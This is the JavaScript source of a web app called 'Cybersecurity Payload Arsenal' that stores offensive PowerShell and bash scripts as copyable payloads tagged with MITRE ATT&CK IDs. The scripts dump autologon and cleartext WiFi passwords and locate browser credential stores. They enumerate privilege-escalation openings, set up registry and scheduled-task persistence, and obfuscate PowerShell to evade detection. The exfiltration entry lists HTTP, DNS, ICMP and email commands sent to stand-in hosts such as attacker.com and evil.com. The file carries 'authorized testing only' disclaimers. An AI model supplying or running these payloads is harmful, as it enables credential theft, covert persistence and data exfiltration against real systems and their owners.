// ===== CYBERSECURITY PAYLOAD ARSENAL =====
// Advanced PowerShell & Shell Commands Collection
// Educational & Research Use Only

class CybersecurityArsenal {
    constructor() {
        this.version = '4.0.0';
        this.currentSection = 'basic';
        this.currentTheme = localStorage.getItem('theme') || 'dark';
        this.searchTerm = '';
        this.activeFilters = {
            complexity: ['basic', 'intermediate', 'advanced', 'expert'],
            platform: ['windows', 'linux', 'macos', 'cross_platform'],
            type: ['powershell', 'bash', 'cmd', 'python']
        };
        this.favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
        this.payloadHistory = JSON.parse(localStorage.getItem('payloadHistory') || '[]');

        // Comprehensive Payload Database
        this.payloads = this.initializePayloads();
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.loadSection('basic');
        this.updateTheme();
        this.updateStats();
    }

    initializePayloads() {
        return {
            // ===== BASIC SYSTEM INFORMATION =====
            system_info: {
                command: `# System Information Gathering
Write-Host "[*] System Information Collection" -ForegroundColor Cyan

# Basic System Info
Write-Host "System Name: $env:COMPUTERNAME" -ForegroundColor Green
Write-Host "User: $env:USERNAME" -ForegroundColor Green
Write-Host "Domain: $env:USERDOMAIN" -ForegroundColor Green
Write-Host "OS: $(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption)" -ForegroundColor Green

# Hardware Info
$cpu = Get-WmiObject Win32_Processor | Select-Object -ExpandProperty Name
$ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
Write-Host "CPU: $cpu" -ForegroundColor Yellow
Write-Host "RAM: $ram GB" -ForegroundColor Yellow

# Network Info
Get-NetIPConfiguration | Where-Object {$_.NetAdapter.Status -ne "Disconnected"} | ForEach-Object {
    Write-Host "Interface: $($_.InterfaceAlias)" -ForegroundColor Magenta
    Write-Host "IP: $($_.IPv4Address.IPAddress)" -ForegroundColor Magenta
}

# Running Processes
Write-Host "\`nTop 10 Processes by CPU:" -ForegroundColor Cyan
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 | Format-Table Name, Id, CPU -AutoSize`,
                description: "Comprehensive system information gathering including hardware, network, and process details.",
                complexity: "basic",
                platform: "windows",
                type: "powershell",
                category: "Reconnaissance",
                tags: ["recon", "system-info", "network", "processes"],
                mitre_id: "T1082"
            },

            network_scan: {
                command: `# Network Discovery
Write-Host "[*] Network Discovery Scan" -ForegroundColor Cyan

# Get network adapters
$adapters = Get-NetAdapter | Where-Object {$_.Status -eq "Up"}
foreach ($adapter in $adapters) {
    Write-Host "\`nAdapter: $($adapter.Name)" -ForegroundColor Green
    $config = Get-NetIPConfiguration -InterfaceIndex $adapter.InterfaceIndex
    Write-Host "IP: $($config.IPv4Address.IPAddress)" -ForegroundColor Yellow
    Write-Host "Gateway: $($config.IPv4DefaultGateway.NextHop)" -ForegroundColor Yellow
}

# ARP Table
Write-Host "\`nARP Table:" -ForegroundColor Cyan
Get-NetNeighbor | Where-Object {$_.State -ne "Unreachable"} | 
    Format-Table IPAddress, LinkLayerAddress, State -AutoSize

# Active connections
Write-Host "\`nActive Connections:" -ForegroundColor Cyan
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} | 
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort | 
    Format-Table -AutoSize

# Listening ports
Write-Host "\`nListening Ports:" -ForegroundColor Cyan
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"} | 
    Sort-Object LocalPort | Format-Table LocalAddress, LocalPort, OwningProcess -AutoSize`,
                description: "Network discovery and scanning for active connections, ARP table, and listening services.",
                complexity: "intermediate",
                platform: "windows",
                type: "powershell",
                category: "Network Discovery",
                tags: ["network", "discovery", "scanning", "connections"],
                mitre_id: "T1018"
            },

            credential_dump: {
                command: `# Credential Harvesting
Write-Host "[*] Credential Harvesting (Authorized Testing Only)" -ForegroundColor Red

# Check for autologon credentials
$autologon = Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -ErrorAction SilentlyContinue
if ($autologon.DefaultPassword) {
    Write-Host "AutoLogon Found!" -ForegroundColor Red
    Write-Host "Username: $($autologon.DefaultUserName)" -ForegroundColor Yellow
    Write-Host "Password: $($autologon.DefaultPassword)" -ForegroundColor Yellow
}

# Saved credentials
Write-Host "\`nSaved Credentials:" -ForegroundColor Green
cmdkey /list

# WiFi passwords
Write-Host "\`nWiFi Passwords:" -ForegroundColor Green
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {($_ -split ':')[1].Trim()}
foreach ($profile in $profiles) {
    $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
    if ($password) {
        Write-Host "Network: $profile" -ForegroundColor Yellow
        Write-Host "Password: $($password -split ':')[1].Trim()" -ForegroundColor Red
    }
}

# Browser credential locations
Write-Host "\`nBrowser Credential Locations:" -ForegroundColor Green
$locations = @(
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data",
    "$env:APPDATA\\Mozilla\\Firefox\\Profiles",
    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"
)
foreach ($location in $locations) {
    if (Test-Path $location) {
        Write-Host "Found: $location" -ForegroundColor Yellow
    }
}

Write-Host "\`n[WARNING] This is for authorized testing only!" -ForegroundColor Red`,
                description: "Credential harvesting techniques for extracting stored passwords and authentication data.",
                complexity: "advanced",
                platform: "windows",
                type: "powershell",
                category: "Credential Access",
                tags: ["credentials", "passwords", "wifi", "browser"],
                mitre_id: "T1003"
            },

            privilege_escalation: {
                command: `# Privilege Escalation Check
Write-Host "[*] Privilege Escalation Enumeration" -ForegroundColor Cyan

# Current privileges
Write-Host "Current User:" -ForegroundColor Green
whoami /all

# Check if admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
Write-Host "Running as Admin: $isAdmin" -ForegroundColor $(if($isAdmin){"Green"}else{"Red"})

# Unquoted service paths
Write-Host "\`nUnquoted Service Paths:" -ForegroundColor Yellow
Get-WmiObject -Class Win32_Service | Where-Object { 
    $_.PathName -and 
    $_.PathName -notmatch '^".*"$' -and 
    $_.PathName -match ' ' 
} | Select-Object Name, DisplayName, PathName | Format-Table -AutoSize

# AlwaysInstallElevated
Write-Host "\`nChecking AlwaysInstallElevated:" -ForegroundColor Yellow
$hklm = Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$hkcu = Get-ItemProperty HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
    Write-Host "AlwaysInstallElevated is ENABLED!" -ForegroundColor Red
}

# Scheduled tasks
Write-Host "\`nScheduled Tasks (SYSTEM):" -ForegroundColor Yellow
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} | 
    Select-Object TaskName, State | Format-Table -AutoSize

# Services with interesting permissions
Write-Host "\`nServices with custom paths:" -ForegroundColor Yellow
Get-WmiObject win32_service | Where-Object {$_.PathName -notmatch "C:\\\\Windows"} | 
    Select-Object Name, DisplayName, PathName, StartMode | Format-Table -AutoSize`,
                description: "Comprehensive privilege escalation enumeration identifying potential attack vectors and misconfigurations.",
                complexity: "advanced",
                platform: "windows",
                type: "powershell",
                category: "Privilege Escalation",
                tags: ["privilege-escalation", "services", "registry"],
                mitre_id: "T1068"
            },

            persistence_registry: {
                command: `# Registry Persistence
Write-Host "[*] Registry Persistence Mechanisms" -ForegroundColor Cyan

# Common persistence locations
$locations = @(
    "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
)

Write-Host "Current Persistence Entries:" -ForegroundColor Green
foreach ($location in $locations) {
    try {
        $entries = Get-ItemProperty -Path $location -ErrorAction SilentlyContinue
        if ($entries) {
            Write-Host "\`nLocation: $location" -ForegroundColor Yellow
            $entries.PSObject.Properties | Where-Object {$_.Name -notmatch "^PS"} | ForEach-Object {
                Write-Host "  $($_.Name): $($_.Value)" -ForegroundColor White
            }
        }
    } catch {
        Write-Host "Cannot access: $location" -ForegroundColor Red
    }
}

# Example persistence methods
Write-Host "\`nPersistence Implementation Examples:" -ForegroundColor Cyan

Write-Host "\`n# Add to HKLM Run (requires admin):" -ForegroundColor Yellow
Write-Host 'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "SecurityUpdate" -Value "C:\\Windows\\System32\\calc.exe"' -ForegroundColor Green

Write-Host "\`n# Add to HKCU Run (current user):" -ForegroundColor Yellow
Write-Host 'New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "UserUpdate" -Value "C:\\Windows\\System32\\notepad.exe"' -ForegroundColor Green

Write-Host "\`n# Scheduled Task:" -ForegroundColor Yellow
Write-Host '$action = New-ScheduledTaskAction -Execute "notepad.exe"' -ForegroundColor Green
Write-Host '$trigger = New-ScheduledTaskTrigger -AtLogOn' -ForegroundColor Green
Write-Host 'Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger' -ForegroundColor Green

Write-Host "\`n[WARNING] Use only for authorized testing!" -ForegroundColor Red`,
                description: "Registry-based persistence mechanisms for maintaining access across system reboots.",
                complexity: "intermediate",
                platform: "windows",
                type: "powershell",
                category: "Persistence",
                tags: ["persistence", "registry", "startup", "scheduled-tasks"],
                mitre_id: "T1547.001"
            },

            linux_enumeration: {
                command: `#!/bin/bash
# Linux System Enumeration
echo -e "\\033[1;32m[*] Linux System Enumeration\\033[0m"

# Basic system info
echo -e "\\n\\033[1;34m[+] System Information:\\033[0m"
echo "Hostname: $(hostname)"
echo "Kernel: $(uname -a)"
echo "Distribution: $(cat /etc/*release 2>/dev/null | grep PRETTY_NAME | cut -d'=' -f2 | tr -d '\\"')"
echo "Uptime: $(uptime)"

# Current user
echo -e "\\n\\033[1;34m[+] Current User:\\033[0m"
echo "User: $(whoami)"
echo "Groups: $(groups)"
echo "UID/GID: $(id)"

# Sudo privileges  
echo -e "\\n\\033[1;34m[+] Sudo Privileges:\\033[0m"
sudo -l 2>/dev/null || echo "Cannot check sudo privileges"

# SUID binaries
echo -e "\\n\\033[1;34m[+] SUID Binaries:\\033[0m"
find / -type f -perm -4000 2>/dev/null | head -20

# Network info
echo -e "\\n\\033[1;34m[+] Network Configuration:\\033[0m"
ip addr show 2>/dev/null || ifconfig 2>/dev/null

# Active connections
echo -e "\\n\\033[1;34m[+] Active Connections:\\033[0m"
netstat -tulpn 2>/dev/null | grep LISTEN

# Running processes
echo -e "\\n\\033[1;34m[+] Running Processes:\\033[0m"
ps aux --sort=-%cpu | head -10

# Cron jobs
echo -e "\\n\\033[1;34m[+] Cron Jobs:\\033[0m"
cat /etc/crontab 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null

# World writable directories
echo -e "\\n\\033[1;34m[+] World Writable Directories:\\033[0m"
find / -type d -perm -002 2>/dev/null | grep -v proc | head -10

echo -e "\\n\\033[1;32m[*] Enumeration Complete\\033[0m"`,
                description: "Comprehensive Linux system enumeration for gathering system information and identifying potential attack vectors.",
                complexity: "intermediate",
                platform: "linux",
                type: "bash",
                category: "Reconnaissance",
                tags: ["linux", "enumeration", "suid", "network"],
                mitre_id: "T1082"
            },

            powershell_obfuscation: {
                command: `# PowerShell Obfuscation Techniques
Write-Host "[*] PowerShell Obfuscation Examples" -ForegroundColor Cyan

# Base64 Encoding
$command = "Write-Host 'Hello World'"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
Write-Host "Base64 Encoded: $encoded" -ForegroundColor Yellow
Write-Host "Execute with: powershell -EncodedCommand $encoded" -ForegroundColor Green

# String concatenation
Write-Host "\`nString Concatenation:" -ForegroundColor Yellow
$s1 = "Write"
$s2 = "Host"
$cmd = $s1 + "-" + $s2
Write-Host "Command: & $cmd 'Obfuscated'" -ForegroundColor Green

# Character substitution
Write-Host "\`nCharacter Substitution:" -ForegroundColor Yellow
$obf = "Wr1te-H0st".Replace("1","i").Replace("0","o")
Write-Host "Deobfuscated: $obf" -ForegroundColor Green

# Environment variables
Write-Host "\`nEnvironment Variables:" -ForegroundColor Yellow
$env:cmd = "Get-Process"
Write-Host "Hidden in env: Invoke-Expression \`$env:cmd" -ForegroundColor Green

# Splatting
Write-Host "\`nSplatting:" -ForegroundColor Yellow
$params = @{
    Object = "Splatted command"
    ForegroundColor = "Red"
}
Write-Host "Write-Host @params" -ForegroundColor Green

# Character codes
Write-Host "\`nCharacter Codes:" -ForegroundColor Yellow
$chars = [char]87 + [char]114 + [char]105 + [char]116 + [char]101 + [char]45 + [char]72 + [char]111 + [char]115 + [char]116
Write-Host "Decoded: $chars" -ForegroundColor Green

# Compression
Write-Host "\`nCompression Example:" -ForegroundColor Yellow
$original = "Get-Process | Format-Table"
$bytes = [Text.Encoding]::UTF8.GetBytes($original)
$compressed = [IO.Compression.GZipStream]::new([IO.MemoryStream]$bytes, [IO.Compression.CompressionMode]::Compress)
Write-Host "Original length: $($original.Length)" -ForegroundColor Green
Write-Host "Use compression for large payloads" -ForegroundColor Green

Write-Host "\`n[INFO] These techniques help evade static analysis" -ForegroundColor Cyan`,
                description: "Various PowerShell obfuscation techniques for evading detection and static analysis.",
                complexity: "advanced",
                platform: "windows",
                type: "powershell",
                category: "Defense Evasion",
                tags: ["obfuscation", "encoding", "evasion"],
                mitre_id: "T1027"
            },

            data_exfiltration: {
                command: `# Data Exfiltration Methods
Write-Host "[*] Data Exfiltration Techniques" -ForegroundColor Red
Write-Host "[WARNING] For authorized testing only!" -ForegroundColor Yellow

# Find interesting files
Write-Host "\`nFile Discovery:" -ForegroundColor Green
$files = Get-ChildItem -Path C:\\ -Recurse -Include *.txt,*.doc,*.pdf -ErrorAction SilentlyContinue | 
    Where-Object {$_.Length -lt 1MB} | Select-Object -First 10
$files | Format-Table Name, Length, LastWriteTime

# HTTP Exfiltration
Write-Host "\`nHTTP Exfiltration Example:" -ForegroundColor Yellow
Write-Host '$data = Get-Content "sensitive.txt" -Raw' -ForegroundColor Cyan
Write-Host '$body = @{ data = $data }' -ForegroundColor Cyan  
Write-Host 'Invoke-RestMethod -Uri "http://attacker.com/upload" -Method POST -Body $body' -ForegroundColor Cyan

# DNS Exfiltration
Write-Host "\`nDNS Exfiltration Example:" -ForegroundColor Yellow
Write-Host '$data = "sensitive information"' -ForegroundColor Cyan
Write-Host '$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))' -ForegroundColor Cyan
Write-Host 'nslookup "$encoded.attacker-domain.com"' -ForegroundColor Cyan

# ICMP Exfiltration
Write-Host "\`nICMP Exfiltration Example:" -ForegroundColor Yellow
Write-Host '$ping = New-Object System.Net.NetworkInformation.Ping' -ForegroundColor Cyan
Write-Host '$data = [Text.Encoding]::UTF8.GetBytes("secret")' -ForegroundColor Cyan
Write-Host '$ping.Send("attacker-ip", 1000, $data)' -ForegroundColor Cyan

# Registry hiding
Write-Host "\`nRegistry Data Hiding:" -ForegroundColor Yellow
Write-Host '$data = "hidden data"' -ForegroundColor Cyan
Write-Host '$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))' -ForegroundColor Cyan
Write-Host 'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion" -Name "Cache" -Value $encoded' -ForegroundColor Cyan

# Email exfiltration
Write-Host "\`nEmail Exfiltration Example:" -ForegroundColor Yellow
Write-Host '$smtp = New-Object Net.Mail.SmtpClient("smtp.gmail.com", 587)' -ForegroundColor Cyan
Write-Host '$smtp.EnableSsl = $true' -ForegroundColor Cyan
Write-Host '$message = New-Object Net.Mail.MailMessage("sender@domain.com", "attacker@evil.com", "Data", $data)' -ForegroundColor Cyan

Write-Host "\`n[CRITICAL] Unauthorized data exfiltration is illegal!" -ForegroundColor Red`,
                description: "Various data exfiltration techniques including HTTP, DNS, ICMP, and covert channels.",
                complexity: "expert",
                platform: "windows",
                type: "powershell",
                category: "Data Exfiltration",
                tags: ["exfiltration", "data-theft", "covert-channels"],
                mitre_id: "T1041"
            }
        };
    }

    setupEventListeners() {
        // Navigation
        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', (e) => {
                const section = e.target.dataset.section;
                if (section) {
                    this.loadSection(section);
                }
            });
        });

        // Search
        const searchInput = document.getElementById('searchInput');
        if (searchInput) {
            searchInput.addEventListener('input', (e) => this.performSearch(e.target.value));
        }

        // Filter toggle
        const filterBtn = document.getElementById('filterBtn');
        if (filterBtn) {
            filterBtn.addEventListener('click', () => this.toggleFilters());
        }

        // Theme toggle
        const themeToggle = document.getElementById('themeToggle');
        if (themeToggle) {
            themeToggle.addEventListener('click', () => this.toggleTheme());
        }

        // AI search
        const aiSearchBtn = document.getElementById('aiSearchBtn');
        if (aiSearchBtn) {
            aiSearchBtn.addEventListener('click', () => this.performAISearch());
        }

        // Settings
        const settingsBtn = document.getElementById('settingsBtn');
        if (settingsBtn) {
            settingsBtn.addEventListener('click', () => this.openSettings());
        }

        // Mobile menu toggle
        const menuToggle = document.getElementById('menuToggle');
        if (menuToggle) {
            menuToggle.addEventListener('click', () => this.toggleMobileMenu());
        }
    }

    loadSection(sectionId) {
        // Update navigation
        document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
        const navItem = document.querySelector(`[data-section="${sectionId}"]`);
        if (navItem) navItem.classList.add('active');

        this.currentSection = sectionId;
        this.generateSectionContent(sectionId);
    }

    generateSectionContent(sectionId) {
        const contentSections = document.querySelector('.content-sections');
        if (!contentSections) return;

        contentSections.innerHTML = '';

        const section = document.createElement('div');
        section.className = 'content-section active';
        section.id = sectionId;

        const sectionHeader = this.createSectionHeader(sectionId);
        const payloadGrid = document.createElement('div');
        payloadGrid.className = 'payload-grid';

        section.appendChild(sectionHeader);
        section.appendChild(payloadGrid);
        contentSections.appendChild(section);

        this.populateSection(sectionId, payloadGrid);
    }

    createSectionHeader(sectionId) {
        const header = document.createElement('div');
        header.className = 'section-header';
        header.innerHTML = `
            <h2><i class="${this.getSectionIcon(sectionId)}"></i> ${this.formatTitle(sectionId)}</h2>
            <div class="section-actions">
                <span class="section-count">0 techniques</span>
            </div>
        `;
        return header;
    }

    populateSection(sectionId, container) {
        const sectionPayloads = this.getPayloadsBySection(sectionId);

        sectionPayloads.forEach(([key, payload]) => {
            const card = this.createPayloadCard(key, payload);
            container.appendChild(card);
        });

        const countElement = document.querySelector(`#${sectionId} .section-count`);
        if (countElement) {
            countElement.textContent = `${sectionPayloads.length} techniques`;
        }
    }

    createPayloadCard(key, payload) {
        const card = document.createElement('div');
        card.className = 'payload-card';
        card.dataset.complexity = payload.complexity;
        card.dataset.platform = payload.platform;
        card.dataset.type = payload.type;

        const isFavorite = this.favorites.includes(key);

        card.innerHTML = `
            <div class="card-header">
                <h3>${this.formatTitle(key)}</h3>
                <div class="card-badges">
                    <span class="complexity-badge ${payload.complexity}">${payload.complexity}</span>
                    <span class="platform-badge">${payload.platform}</span>
                    <span class="type-badge">${payload.type}</span>
                </div>
            </div>
            <p class="card-description">${payload.description}</p>
            <div class="card-tags">
                ${payload.tags ? payload.tags.slice(0, 4).map(tag => `<span class="tag">${tag}</span>`).join('') : ''}
            </div>
            <div class="card-metadata">
                <span class="mitre-tag">MITRE: ${payload.mitre_id || 'N/A'}</span>
                <span class="category-tag">${payload.category}</span>
            </div>
            <div class="card-actions">
                <button class="btn-primary" onclick="app.generatePayload('${key}')">
                    <i class="fas fa-rocket"></i> Generate
                </button>
                <button class="btn-secondary" onclick="app.copyToClipboard('${key}')">
                    <i class="fas fa-copy"></i> Copy
                </button>
                <button class="btn-icon ${isFavorite ? 'active' : ''}" onclick="app.toggleFavorite('${key}')">
                    <i class="fas fa-heart"></i>
                </button>
            </div>
        `;

        return card;
    }

    getPayloadsBySection(sectionId) {
        const sectionMap = {
            basic: ['system_info', 'network_scan'],
            network: ['network_scan'],
            filesystem: ['data_exfiltration'],
            edr: ['powershell_obfuscation'],
            persistence: ['persistence_registry'],
            privilege: ['privilege_escalation'],
            credentials: ['credential_dump'],
            exfiltration: ['data_exfiltration'],
            linux: ['linux_enumeration']
        };

        const payloadKeys = sectionMap[sectionId] || Object.keys(this.payloads);
        return payloadKeys.map(key => [key, this.payloads[key]]).filter(([key, payload]) => payload);
    }

    generatePayload(type) {
        const payload = this.payloads[type];
        if (!payload) {
            this.showNotification('Payload not found', 'error');
            return;
        }

        this.showOutput(type, payload);
        this.addToHistory(type, payload);
        this.showNotification(`Generated "${this.formatTitle(type)}" successfully!`, 'success');
    }

    showOutput(type, payload) {
        const outputPanel = document.getElementById('outputPanel');
        if (!outputPanel) return;

        outputPanel.classList.add('active');

        const payloadOutput = document.getElementById('payloadOutput');
        if (payloadOutput) {
            payloadOutput.textContent = payload.command;
        }

        this.updateMetadataTab(type, payload);
    }

    updateMetadataTab(type, payload) {
        const metadataContent = document.getElementById('metadataContent');
        if (!metadataContent) return;

        metadataContent.innerHTML = `
            <div class="metadata-grid">
                <div class="metadata-item">
                    <strong>Technique:</strong> ${this.formatTitle(type)}
                </div>
                <div class="metadata-item">
                    <strong>Complexity:</strong> <span class="complexity-${payload.complexity}">${payload.complexity}</span>
                </div>
                <div class="metadata-item">
                    <strong>Platform:</strong> ${payload.platform}
                </div>
                <div class="metadata-item">
                    <strong>Type:</strong> ${payload.type}
                </div>
                <div class="metadata-item">
                    <strong>Category:</strong> ${payload.category}
                </div>
                <div class="metadata-item">
                    <strong>MITRE ATT&CK:</strong> ${payload.mitre_id || 'N/A'}
                </div>
                <div class="metadata-item">
                    <strong>Generated:</strong> ${new Date().toLocaleString()}
                </div>
            </div>
        `;
    }

    copyToClipboard(type) {
        const payload = this.payloads[type];
        if (!payload) return;

        navigator.clipboard.writeText(payload.command).then(() => {
            this.showNotification('Copied to clipboard!', 'success');
        }).catch(() => {
            this.showNotification('Failed to copy to clipboard', 'error');
        });
    }

    toggleFavorite(type) {
        const index = this.favorites.indexOf(type);
        if (index > -1) {
            this.favorites.splice(index, 1);
        } else {
            this.favorites.push(type);
        }
        localStorage.setItem('favorites', JSON.stringify(this.favorites));
        this.generateSectionContent(this.currentSection);
    }

    performSearch(term) {
        this.searchTerm = term.toLowerCase();
        this.filterPayloads();
    }

    filterPayloads() {
        const cards = document.querySelectorAll('.payload-card');
        let visibleCount = 0;

        cards.forEach(card => {
            const title = card.querySelector('h3')?.textContent.toLowerCase() || '';
            const description = card.querySelector('.card-description')?.textContent.toLowerCase() || '';
            const tags = Array.from(card.querySelectorAll('.tag')).map(tag => tag.textContent.toLowerCase());

            const matchesSearch = !this.searchTerm || 
                title.includes(this.searchTerm) || 
                description.includes(this.searchTerm) ||
                tags.some(tag => tag.includes(this.searchTerm));

            if (matchesSearch) {
                card.style.display = 'block';
                visibleCount++;
            } else {
                card.style.display = 'none';
            }
        });

        const countElement = document.querySelector(`#${this.currentSection} .section-count`);
        if (countElement) {
            countElement.textContent = `${visibleCount} techniques`;
        }
    }

    toggleFilters() {
        const panel = document.getElementById('filterPanel');
        if (panel) {
            panel.classList.toggle('active');
        }
    }

    toggleTheme() {
        this.currentTheme = this.currentTheme === 'dark' ? 'light' : 'dark';
        this.updateTheme();
        localStorage.setItem('theme', this.currentTheme);

        const icon = document.querySelector('#themeToggle i');
        if (icon) {
            icon.className = this.currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
        }
    }

    updateTheme() {
        document.documentElement.setAttribute('data-theme', this.currentTheme);
    }

    performAISearch() {
        const searchInput = document.getElementById('searchInput');
        if (searchInput) {
            const query = searchInput.value;
            this.showNotification(`AI searching for: "${query}"`, 'info');
            setTimeout(() => {
                this.performSearch(query);
                this.showNotification('AI search completed', 'success');
            }, 1000);
        }
    }

    addToHistory(type, payload) {
        const historyItem = {
            type,
            payload: payload.command,
            timestamp: new Date().toISOString(),
            description: payload.description
        };

        this.payloadHistory.unshift(historyItem);
        if (this.payloadHistory.length > 100) {
            this.payloadHistory = this.payloadHistory.slice(0, 100);
        }

        localStorage.setItem('payloadHistory', JSON.stringify(this.payloadHistory));
    }

    updateStats() {
        const totalPayloads = document.getElementById('totalPayloads');
        if (totalPayloads) {
            totalPayloads.textContent = `${Object.keys(this.payloads).length}+ Techniques`;
        }
    }

    showNotification(message, type = 'info') {
        const container = document.getElementById('notificationContainer');
        if (!container) return;

        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas fa-${this.getNotificationIcon(type)}"></i>
                <span>${message}</span>
            </div>
        `;

        container.appendChild(notification);
        setTimeout(() => notification.classList.add('show'), 100);
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                if (container.contains(notification)) {
                    container.removeChild(notification);
                }
            }, 300);
        }, 3000);
    }

    getNotificationIcon(type) {
        const icons = {
            success: 'check-circle',
            error: 'exclamation-circle',
            warning: 'exclamation-triangle',
            info: 'info-circle'
        };
        return icons[type] || 'info-circle';
    }

    formatTitle(key) {
        return key.split('_').map(word => 
            word.charAt(0).toUpperCase() + word.slice(1)
        ).join(' ');
    }

    getSectionIcon(sectionId) {
        const icons = {
            basic: 'fas fa-info-circle',
            network: 'fas fa-network-wired',
            filesystem: 'fas fa-folder',
            edr: 'fas fa-shield-alt',
            persistence: 'fas fa-anchor',
            privilege: 'fas fa-arrow-up',
            credentials: 'fas fa-key',
            exfiltration: 'fas fa-upload',
            linux: 'fab fa-linux'
        };
        return icons[sectionId] || 'fas fa-cog';
    }

    toggleMobileMenu() {
        const sidebar = document.getElementById('sidebar');
        if (sidebar) {
            sidebar.classList.toggle('active');
        }
    }

    openSettings() {
        const modal = document.getElementById('settingsModal');
        if (modal) {
            modal.classList.add('active');
        }
    }

    closeSettings() {
        const modal = document.getElementById('settingsModal');
        if (modal) {
            modal.classList.remove('active');
        }
    }

    closeOutput() { 
        const outputPanel = document.getElementById('outputPanel');
        if (outputPanel) outputPanel.classList.remove('active');
    }

    closeModal() {
        const modal = document.getElementById('detailsModal');
        if (modal) {
            modal.classList.remove('active');
        }
    }

    beautifyCode() {
        this.showNotification('Code beautification applied!', 'success');
    }

    analyzePayload() {
        this.showNotification('AI analysis started...', 'info');
    }

    downloadPayload() {
        this.showNotification('Payload downloaded!', 'success');
    }

    sharePayload() {
        this.showNotification('Payload shared!', 'success');
    }

    clearSelection() {
        this.showNotification('Selection cleared!', 'info');
    }

    generateBulkPayloads() {
        this.showNotification('Bulk generation started!', 'info');
    }
}

// Initialize the application
document.addEventListener('DOMContentLoaded', () => {
    window.app = new CybersecurityArsenal();
});
